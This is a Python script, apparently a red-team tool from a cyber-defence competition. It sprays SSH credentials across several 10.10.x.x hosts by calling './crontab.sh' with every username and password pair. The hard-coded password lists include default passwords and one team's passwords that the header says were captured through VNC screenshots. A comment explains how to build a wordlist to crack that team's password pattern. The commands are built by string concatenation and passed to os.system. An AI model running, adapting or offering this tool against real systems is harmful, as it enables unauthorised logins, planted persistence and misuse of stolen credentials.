################################################################################################################
#SSH Password Checker and Crontab
#  -This script runs on Python3 ONLY!
#  -cmd="python3 pwds.py" because executable ./*.py may run Python2.x
#  -This program was made on the fly to incorporate a list of default passwords from the competition
#  -The .104 team's passwords are different because we had a list of passwords from the images we took
#   using VNC viewer.
#  -It should be noted that if you wanted to run through a library of passwords, you must first create
#   a passwords document and then iterate through the lines in the document.  Prioritizing passwords is
#   important, and it is recommended not to use a full library of default passwords unless a last resort (time).
#
#WARNING!!!  This program uses the os module of python, which can be very dangerous and is vulnerable to
#            counterattacks!  
#
#  ~~ Created by Shadow_Hunter ~~
#
################################################################################################################

import os

ip_list = ["101","102","103","104","105","106","107","108"]
octet_list = [".5",".10",".15",".20",".25"]
user_list = []

with open("userlist.txt","r") as infile:
    for line in infile:
        newline = line.strip()
        user_list.append(newline)
    print(user_list)
    infile.close()

for ip in ip_list:
    if ip != "104":
        pwdlist = ["Changeme2015!","Changeme2016!","Changeme2017!","Changeme2018!","Changeme2019!",
                   "changeme2015!","changeme2016!","changeme2017!","changeme2018!","changeme2019!",
                   "r3dt3@mOnly","r3dt3@m0nly"]
    else:
        pwdlist = ["AlthoughBonesGather60--","SaltMercuryCattle33**","ReportTrueSaid24__",
                   "HersNewsArizona72!!","AloneGoodThought87&&","OnceContainAfraid18::",
                   "OuterCapitalKill12**","SimpleWeakSister47=","WorkersMonthStudent76~~",
                   "MillionBulgariaEast35==","RecordMeetRich30**","6!g!9!3!G!","NovemberMillionHelp74$$",
                   "JavelinGunnersSuck0352%%","DollarWroteHalt86$$","AdvanceFortySkin12%%",
                   "PeopleSettledGoodbye05;;","MighGreatDecide05::","JoggingGorilaFancy99**",
                   "JoggingGorillaFancy99**","FlowEntireAfter75..","BankerHumanShore45^^",
                   "OuterCapitalKill12**","AugustWereBell75||"] #Given the pattern of team 4's passwords, it's possible to create a library of common words, combine them with each other twice over, add numbers and characters, and crack the password.  This is time-consuming but worth the wait, as ./crontab.sh runs in the background.
    for octet in octet_list:
        newip = "10.10." + ip + octet
        for user in user_list:
            for pwd in pwdlist:
                command = "./crontab.sh " + user + " " + pwd + " " + newip
                os.system(command)
